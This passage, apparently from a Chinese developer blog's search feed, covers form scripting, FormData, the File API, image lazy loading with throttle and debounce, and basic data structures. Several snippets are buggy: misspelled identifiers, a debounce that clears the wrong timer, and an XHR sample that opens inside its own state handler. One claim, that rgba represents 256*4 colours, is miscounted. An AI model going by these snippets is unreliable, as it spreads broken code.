class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> selectbox = <span class="built_in">document</span>.forms[<span class="number">0</span>].elements[<span class="string">'location'</span>];</span><br><span class="line">selectbox.options[<span class="number">0</span>].text;    <span class="comment">// 选线的文本</span></span><br><span class="line">selectbox.options[<span class="number">0</span>].value;   <span class="comment">// 选项的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 选中的选项 selectedIndex</span></span><br><span class="line"><span class="keyword">var</span> selectedIndex = selectbox.selectedIndex;</span><br><span class="line"><span class="keyword">var</span> selectedOption = selectbox.options[selectedIndex];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新增选项</span></span><br><span class="line"><span class="keyword">var</span> newOption = <span class="keyword">new</span> Option(<span class="string">"Option text"</span>, <span class="string">"Option value"</span>);</span><br><span class="line">selectbox.add(newOption, <span class="literal">undefined</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除选项</span></span><br><span class="line">seletbox.remove(<span class="number">0</span>)  <span class="comment">// 移除第一个选项</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-表单序列化与formData"><a href="#4-表单序列化与formData" class="headerlink" title="4. 表单序列化与formData"></a>4. 表单序列化与formData</h3><p>浏览器怎样把表单数据发送给服务器：</p><ul><li>对表单字段的名称和值进行URL编码，使用(&amp;)分隔。</li><li>不发送禁用的表单字段，不发送type为reset, button, image的<code>&lt;button&gt;和&lt;input&gt;</code></li><li>只发送勾选的复选框和单选按钮，多选选择框中每个选中的值单独一个条目</li></ul><p>XMLHttpRequest2为表单数据定义了formData类型，方便创建与表单格式相同的数据。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = <span class="keyword">new</span> FormData();</span><br><span class="line">data.append(<span class="string">'name'</span>, <span class="string">'Nicholas'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据表单元素填入键值对</span></span><br><span class="line"><span class="keyword">var</span> data = <span class="keyword">new</span> FormData(<span class="built_in">document</span>.forms[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure></p><p>创建了FormData的实例后，可以将它直接传给XHR的send()方法。使用FormData的方便之处体现在不必明确地在XHR对象上设置请求头部。XHR对象能够识别FormData的实例，并配置适当的头部信息。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = createXHR();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  xhr.open(<span class="string">'post'</span>, <span class="string">'postexample.php'</span>, <span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">'user-info'</span>);</span><br><span class="line">  xhr.send(<span class="keyword">new</span> FormData(form));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-File-API"><a href="#5-File-API" class="headerlink" title="5. File API"></a>5. File API</h3><h4 id="5-1-File对象"><a href="#5-1-File对象" class="headerlink" title="5.1 File对象"></a>5.1 File对象</h4><p>2000年前，处理文件的唯一方式是在表单中加入<code>&lt;input type=&quot;file&quot;&gt;</code>字段。后来HTML5在DOM中为文件输入元素添加了一个files集合。选择了一个或多个文件时，files集合中将包含一组File对象，每个File对象都有下列只读属性:</p><ul><li>name: 本地文件系统中的文件名</li><li>size: 文件的字节大小</li><li>type: 字符串，文件的MIME类型</li><li>lastModifiedDate: 字符串，文件上一次被修改的时间</li></ul><p>通过监听change事件并读取files集合就可以知道选择的每个文件的信息<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fileList = <span class="built_in">document</span>.getElementById(<span class="string">'files-list'</span>);</span><br><span class="line">EventUtil.addHanlder(fileList, <span class="string">"change"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> file = event.files[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">console</span>.log(file.name + file.type + file.size + <span class="string">'bytes'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-2-使用XHR上传文件"><a href="#5-2-使用XHR上传文件" class="headerlink" title="5.2 使用XHR上传文件"></a>5.2 使用XHR上传文件</h4><p>将文件拖进浏览器窗口，调用append()方法传入相应的file对象，再把FormData对象传递给XHR的send()方法。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> droptarget = <span class="built_in">document</span>.getElementById(<span class="string">'droptarget'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleEvent</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  event.preventDefault(event);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (event.type == <span class="string">'drop'</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> data = <span class="keyword">new</span> FormData();</span><br><span class="line">    <span class="keyword">var</span> files = event.dataTransfer.files;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; files.length; i++)&#123;</span><br><span class="line">      data.append(<span class="string">"file"</span> + i, files[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr.open(<span class="string">"post"</span>, <span class="string">"FileAPIExample06Upload.php"</span>, <span class="literal">true</span>);</span><br><span class="line">    xhr.send(data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">EventUtil.addHandler(droptarget, <span class="string">"dragenter"</span>, handleEvent);</span><br><span class="line">EventUtil.addHandler(droptarget, <span class="string">"dragover"</span>, handleEvent);</span><br><span class="line">EventUtil.addHandler(droptarget, <span class="string">"drag"</span>, handleEvent);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-3-FileReader类型"><a href="#5-3-FileReader类型" class="headerlink" title="5.3 FileReader类型"></a>5.3 FileReader类型</h4><p>FileReader是一种异步文件读取机制，FileReader提供了如下几个方法:</p><ul><li>readAsText(file, encoding): 以纯文本形式读取文件，将读取到的文本保存在result属性中。</li><li>readAsDataURL(file): 读取文件并将文件以数据URI的形式保存在result属性中。</li><li>readAsBinaryString(file)</li><li>readAsArrayBuffer(file)<br>略</li></ul><p><br></p><h3 id="6-富文本编辑"><a href="#6-富文本编辑" class="headerlink" title="6. 富文本编辑"></a>6. 富文本编辑</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frames[<span class="string">"richedit"</span>].document.designMode = <span class="string">"on"</span>;</span><br></pre></td></tr></table></figure><p>略</p><p><br></p><p><a href="https://juejin.im/post/5c9ac607f265da6103588b31" target="_blank" rel="noopener">https://juejin.im/post/5c9ac607f265da6103588b31</a><br><a href="https://juejin.im/post/5b55c118f265da0f6f1aa354" target="_blank" rel="noopener">https://juejin.im/post/5b55c118f265da0f6f1aa354</a></p>]]></content>
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>节流与去抖 —— 网页图片加载优化</title>
      <link href="/2019/03/26/%E7%BD%91%E9%A1%B5%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD%E4%BC%98%E5%8C%96/"/>
      <url>/2019/03/26/%E7%BD%91%E9%A1%B5%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD%E4%BC%98%E5%8C%96/</url>
      <content type="html"><![CDATA[<h3 id="1-问题"><a href="#1-问题" class="headerlink" title="1. 问题"></a>1. 问题</h3><p>elitemba主站 以图片展示为主，启动页面时加载过多图片，图片体积过大，导致等待时间过长。这些图片请求几乎是并发的。在Chrome浏览器，同一域名，最多支持6个请求的并发，其他的请求将会推入到队列中等待，直到6个请求中的一个完成后，队列中的新请求才会发出。</p><p>下面列出一些图片加载优化方法。</p><p><br></p><h3 id="1-图片优化"><a href="#1-图片优化" class="headerlink" title="1. 图片优化"></a>1. 图片优化</h3><p><em>单位像素优化</em></p><ul><li><p><code>rgba</code>颜色值可以表示256*4种颜色，这是一个很大的数字。当减少色板中的颜色种类，这样表示单位像素的字节数就减少了。</p></li><li><p>不同的图片格式有自己的减少单位像素体积的算法，同时也有自己的优势和劣势。比如<code>jpeg</code>和<code>png</code>不支持动画效果，<code>jpeg</code>图片体积小但是不支持透明度。而<code>WebP</code>和<code>jpeg</code>格式相比，其体积更减少30%，同时还支持动画和透明度。</p></li></ul><p><em>图片像素总数优化</em></p><ul><li><p>大图片不仅造成了图片加载的时长，同时由于图片尺寸需要缩小增加CPU的负担。在保证图片清晰度的前提下，尽量使用体积小的图片。</p></li><li><p>阿里云oss图片服务 / 七牛图片服务，提供了图片格式转换、按尺寸裁剪等图片处理功能。配合<code>lib-flexible</code>，就可以对不同设备加载不同尺寸的图片。</p></li></ul><p><br><br><br></p><h3 id="2-图片未加载完的占位显示"><a href="#2-图片未加载完的占位显示" class="headerlink" title="2. 图片未加载完的占位显示"></a>2. 图片未加载完的占位显示</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">img</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">img</span><span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">padding-top</span>: <span class="number">60%</span>;  <span class="comment">/* 图片比例 */</span></span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#ccc</span> no-repeat center center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;img src="1.png"&gt;</span><br></pre></td></tr></table></figure><p>pc上，一般我们会为<code>&lt;img&gt;</code>设置width和height属性来解决图片占位问题。但在移动端，用占位图或min-height来占位，如果与需要加载的图片尺寸差别很大，会出现页面的内容跳动，这也不是我们想要的。</p><p><br><br><br></p><h3 id="3-图片懒加载"><a href="#3-图片懒加载" class="headerlink" title="3. 图片懒加载"></a>3. 图片懒加载</h3><p>滚动到可视区域后再去加载图片<br><br></p><h4 id="3-1-原理"><a href="#3-1-原理" class="headerlink" title="3.1 原理"></a>3.1 原理</h4><p>将页面中<code>&lt;img&gt;</code>的<code>src</code>指向一张默认图，然后定义<code>data-src</code>指向真实的图片。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 注意: 图片要指定宽高 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"default.jpg"</span> <span class="attr">data-src</span>=<span class="string">"http://www.elitemba.cn/static/images/1.png"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>当载入页面时，先把可视区域内的<code>&lt;img&gt;</code>标签的<code>data-src</code>属性值赋给<code>src</code>。然后监听滚动事件，同理修改可视区域的图片的src值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'img'</span>);</span><br><span class="line"><span class="keyword">var</span> num = img.length;</span><br><span class="line"><span class="keyword">var</span> n = <span class="number">0</span>;  <span class="comment">// 存储图片加载到的位置，避免每次都从第一张图片开始遍历</span></span><br><span class="line"></span><br><span class="line">lazyload(); <span class="comment">// 页面载入完毕加载可视区域内的图片</span></span><br><span class="line"><span class="built_in">window</span>.onscroll = lazyload;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lazyload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> seeHeight = <span class="built_in">document</span>.documentElement.clientHeight; <span class="comment">// 可见区域高度</span></span><br><span class="line">  <span class="keyword">var</span> scrollTop = <span class="built_in">document</span>.documentElement.scrollTop || <span class="built_in">document</span>.body.scrollTop; <span class="comment">// 滚动条距离顶部高度</span></span><br><span class="line">  <span class="keyword">for</span> ( <span class="keyword">var</span> i = n ; i &lt; num; i++ )&#123;</span><br><span class="line">    <span class="keyword">if</span> (img[i].offsetTop &lt; seeHeight + scrollTop)&#123;</span><br><span class="line">      <span class="keyword">if</span> (img[i].getAttribute(<span class="string">"src"</span>) == <span class="string">"default.jpg"</span>)&#123;</span><br><span class="line">        img[i].src = img[i].getAttribute(<span class="string">"data-src"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      n = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-2-节流函数"><a href="#3-2-节流函数" class="headerlink" title="3.2 节流函数"></a>3.2 节流函数</h4><p>当函数绑定在<code>scroll</code>事件上，页面滚动时，函数会被高频触发，这非常影响浏览器的性能。这时需要限制触发频率。<br><strong>节流函数: 只允许一个函数在n秒内执行一次</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fun 要执行的函数</span></span><br><span class="line"><span class="comment">// time 在time时间内必须执行一次</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">fun, time</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> startTime = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> context = <span class="keyword">this</span>,</span><br><span class="line">        args = <span class="built_in">arguments</span>,</span><br><span class="line">        curTime = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果达到了规定的触发时间间隔，触发handler</span></span><br><span class="line">    <span class="keyword">if</span> ( curTime - startTime &gt;= time )&#123;</span><br><span class="line">      fun.apply(context, args);</span><br><span class="line">      startTime = curTime;</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">"scroll"</span>, throttle(lazy, <span class="number">1000</span>))</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-3-去抖函数"><a href="#3-3-去抖函数" class="headerlink" title="3.3 去抖函数"></a>3.3 去抖函数</h4><p>让函数延迟执行。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">fn, delay</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> time = <span class="literal">null</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> context = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">let</span> args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">    clearTimeout(time);</span><br><span class="line">    timer = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      fn.apply(context, args)</span><br><span class="line">    &#125;, delay)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 让函数延迟500s执行</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">"scroll"</span>, debounce(lazyload, <span class="number">500</span>))</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-骨架屏"><a href="#4-骨架屏" class="headerlink" title="4. 骨架屏"></a>4. 骨架屏</h3><p>骨架屏可以理解为<em>当数据还未加载进来前，页面的一个空白版本</em>。页面渲染完成之前，用户会看到当前页面的大致骨架。</p><p>下面的示例图，第一个是骨架屏，第二个是菊花图，第三个无优化。<br><br><br><img src="/2019/03/26/网页图片加载优化/2.gif" style="max-width: 800px"><br><br></p><p>生成骨架屏的方式: </p><ul><li>手写HTML，CSS定制骨架屏，但是维护成本高</li><li>使用图片作为骨架屏： 小米商城的移动端页面</li><li>自动生成并自动插入静态骨架屏 page-skeleton-webpack-plugin</li></ul><p><br></p><h3 id="5-渐进式图片加载"><a href="#5-渐进式图片加载" class="headerlink" title="5. 渐进式图片加载"></a>5. 渐进式图片加载</h3><p>知乎会用低分辨的模糊图片来做预览图，代替懒加载图片时用的logo占位图，预览图大小在2kb-3kb之间。<br><img src="/2019/03/26/网页图片加载优化/1.gif"></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://zhuanlan.zhihu.com/p/33370207" target="_blank" rel="noopener">网页图片加载优化方案</a></li><li><a href="https://github.com/Jocs/jocs.github.io/issues/22" target="_blank" rel="noopener">一种自动化生成骨架屏的方案</a></li><li><a href="https://juejin.im/post/5b79a2786fb9a01a18267362" target="_blank" rel="noopener">Vue项目骨架屏注入实践</a></li><li><a href="https://github.com/ccforward/cc/issues/64" target="_blank" rel="noopener">适用于vue.js和原生js的渐进式图片加载</a></li><li><a href="https://juejin.im/post/583b10640ce463006ba2a71a" target="_blank" rel="noopener">实现图片懒加载</a></li><li><a href="https://github.com/ElemeFE/page-skeleton-webpack-plugin" target="_blank" rel="noopener">page-skeleton-webpack-plugin</a></li><li><a href="https://www.jianshu.com/p/a5fd143c6184" target="_blank" rel="noopener">CSS实现图片未加载完成时占位显示</a></li><li><a href="https://lq1228.github.io/front/article/2016/11/24/layout-image.html" target="_blank" rel="noopener">CSS实现 图片加载前的占位高度预设</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>数据结构与算法</title>
      <link href="/2019/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
      <url>/2019/03/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/</url>
      <content type="html"><![CDATA[<h3 id="1-数组"><a href="#1-数组" class="headerlink" title="1. 数组"></a>1. 数组</h3><p>数组(Array)是一种线性表数据结构。它用一组连续的内存空间，来存储一组相同类型的数据。</p><ul><li><p>线性表<br>线性表就是数据排成像一条线一样的结构。每个线性表上的数据最多只有前和后两个方向。除了数组，链表、队列、栈等都是线性表结构。<br><img src="/2019/03/14/数据结构与算法/1.jpg" style="max-width: 500px; margin-top: 20px"></p></li><li><p><em>随机访问</em><br>连续的内存空间和相同类型的数据。因为有了这个限制，它才有了一个堪称“杀手锏”的特性：<strong>随机访问</strong>。也因为这两个限制，让数组的很多操作变得非常低效，比如删除、插入一个数据，为了保证连续性，就需要做大量的数据搬移工作。</p></li><li><p>数组如何通过下标随机访问?<br>通过寻址共识，计算出存储元素的内存地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a[i]_address = base_address + i * data_type_size</span><br><span class="line"></span><br><span class="line">// 二位数组内存寻址</span><br><span class="line">对于m * n的数组, a[i][j]( i &lt; m, j &lt; n)的地址为</span><br><span class="line">a[i][j]_address = base_address + ( i * n + j ) * data_type_size</span><br></pre></td></tr></table></figure></li><li><p><em>低效的“插入”和“删除”</em><br><strong>为了保持内存数组的连续性</strong>，将一个数据插入到数组中的第k个位置，我们需要将第k~n这部分的元素都顺序往后挪以为。平均情况时间复杂度为(1+2+..+n)/n = O(n).</p></li><li><p>改进方法（舍弃数组的连续性）<br><em>快排</em>:  直接将第k位的数据搬移到数组元素的最后，把新的元素直接放入第k个位置。时间复杂度降为O(1)<br><em>JVM标记清除垃圾</em>:  删除操作，只是记录数据已经被删除。当数组没有更多空间存储数据时，才触发执行一次真正的删除操作。大大减少了数据搬移的次数。</p></li><li><p>数组的访问越界问题</p></li><li>为什么数组要从0开始编号?<br>如果从1开始编号，每次随机访问数组元素都多了一次减法运算。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 从0开始</span><br><span class="line">a[k]_address = base_address + k * type_size</span><br><span class="line"></span><br><span class="line">// 从1开始</span><br><span class="line">a[k]_address = base_address + ( k - 1 ) * type_size</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-链表"><a href="#2-链表" class="headerlink" title="2. 链表"></a>2. 链表</h3><p>数组需要一块连续的内存空间来存储，而链表恰恰相反，它并不需要一块连续的内存空间，它通过“指针”将一组<strong>零散的内存块</strong>串联起来使用。<br><img src="/2019/03/14/数据结构与算法/2.jpg" style="max-width: 500px; margin-top: 20px"></p><p><br></p><h4 id="2-1-单链表"><a href="#2-1-单链表" class="headerlink" title="2.1 单链表"></a>2.1 单链表</h4><p>为了将所有节点串起来，每个链表的节点除了存储数据之外，还需要记录链上的下一个结点的地址。我们把这个记录下个节点地址的指针叫作<strong>后续指针 next</strong>。<br><img src="/2019/03/14/数据结构与算法/3.jpg" style="max-width: 500px; margin: 20px auto"></p><p>与数组一样，链表也支持数据的查找、插入和删除。在链表中插入或者删除一个数据，我们并不需要为了保持内存的连续性而搬移结点，我们只需要考虑相邻结点的指针改变，时间复杂度是O(1)。<br><img src="/2019/03/14/数据结构与算法/4.jpg" style="max-width: 500px; margin: 20px auto"></p><p>但是，链表想要随机访问第k个元素，就无法像数组那样，通过寻址公式直接计算出对应的内存地址。而是需要根据指针一个结点一个结点地依次遍历，直到找到相应的结点，时间复杂度是O(n)。</p><p><br></p><ul><li><strong>循环链表</strong><br>单链表的尾结点指针指向空地址，来表示这是最后的结点。而循环链表的尾结点指向链表的头结点。</li></ul><p><br></p><h4 id="2-2-双向链表"><a href="#2-2-双向链表" class="headerlink" title="2.2 双向链表"></a>2.2 双向链表</h4><p>每个结点不止有一个后续指针<code>next</code>指向后面的结点，还有一个前驱指针<code>prev</code>指向签名的节点。<br><img src="/2019/03/14/数据结构与算法/5.jpg" style="max-width: 500px; margin: 20px auto"></p><ul><li><strong>相比单链表，双向链表适合解决哪种问题？</strong><br>在实际的开发中，从链表中删除一个数据无外乎这两种情况：<br><em>- 删除结点中“值等于某个给定值”的结点</em><br>此时，无论是单链表还是双链表，都需要从头结点一个个遍历对比，知道遭到给定值的结点。时间复杂度是O(n)。<br><em>- 删除给定指针指向的结点</em><br>删除某个结点需要知道其前驱结点，而单链表不能直接获取。为了找到前驱结点，我们还要从头结点开始遍历链表，知道p-&gt;next = q。时间复杂度为O(n)，而双向链表只需O(1)。</li></ul><p><br></p><ul><li><strong>有序链表</strong><br>对于有序链表，双向链表的按值查询的效率更高。我们可以记录上次查找的位置p，每次查询时，根据要查找的值与p的大小关系，决定往前还是往后查找，平均只需要查找一半的数据。 Java LinkedHashMap</li></ul><p><br></p><ul><li><strong>实现LRU缓存淘汰算法</strong><blockquote><p>缓存是一种提高数据读取性能的技术，常见的有CPU缓存、数据库缓存、浏览器缓存等。缓存的大小有限，当缓存被用满时，哪些数据应该被清理，哪些数据应该被保留。这就需要缓存淘汰策略来决定。常见的策略有三种: 先进先出策略(FIFO - first in, first out), 最少使用策略(LFU - least frequently used), 最近最少使用策略(LRU - least recently used)。</p></blockquote></li></ul><p><em>实现思路: 越靠近尾部的结点是越早前访问的。</em></p><ol><li>维护一个有序单链表</li><li>当要访问一个数据时，我们从链表头开始遍历链表。<br>如果数据已经存在于链表中，将其从原来的文职删除，再插入到链表的头部。<br>如果数据不存在于链表中，此时缓存未满，将此结点直接插入到链表的头部。<br>如果数据不存在与链表中，此时缓存已满，则删除链表尾结点，将新数据插入链表的头部。</li></ol><p><br></p><ul><li><strong>判断一个字符串是否是回文字符串</strong><br>使用快慢两个指针找到链表中点，慢指针每次前进1步，快指针每次前进2步。在慢指针前进的过程中，同时修改其next指针，使得链表前半部分反序。最后比较中点两侧的链表是否相等。</li></ul><p><br></p><h4 id="2-3-指针的含义"><a href="#2-3-指针的含义" class="headerlink" title="2.3 指针的含义"></a>2.3 指针的含义</h4><p>有的语言有“指针”的概念，有的没有，取而代之的是“引用”。无论是“指针”还是“引用”，指的都是存储所指对象的内存位置。</p><p><em>将某个变量赋值给指针，实际上就是将这个变量的地址赋值给指针，或者反过来说，指针中存储了这个变量的内存地址，指向了这个变量，通过指针就能找到这个变量。</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// p结点的next指针存储了q结点的内存地址</span><br><span class="line">p-&gt;next=q</span><br><span class="line"></span><br><span class="line">// p结点的next指针存储了p结点的下下一个结点的内存地址</span><br><span class="line">p-&gt;next = p-&gt;next-&gt;next</span><br></pre></td></tr></table></figure><ul><li><p>单链表的插入删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 插入一个新结点</span><br><span class="line">new_node-&gt;next = p-&gt;next;</span><br><span class="line">p-&gt;next = new_node;</span><br><span class="line"></span><br><span class="line">// 向一个空链表插入第一个结点</span><br><span class="line">if( head == null )&#123;</span><br><span class="line">  head = new_node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 删除结点</span><br><span class="line">p-&gt;next = p-&gt;next-&gt;next</span><br><span class="line"></span><br><span class="line">// 删除最后一个结点</span><br><span class="line">if( head-&gt;next == null )&#123;</span><br><span class="line">  head = null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>哨兵结点<br>哨兵结点是不存储数据的。</p></li></ul><p><br></p><h3 id="3-栈"><a href="#3-栈" class="headerlink" title="3. 栈"></a>3. 栈</h3><p>后进者先出，先进者后出，这就是典型的“栈”结构。从操作特性来看，栈是一种“操作受限”的线性表，只允许在一端插入和删除数据。</p><ul><li>用数组实现栈</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 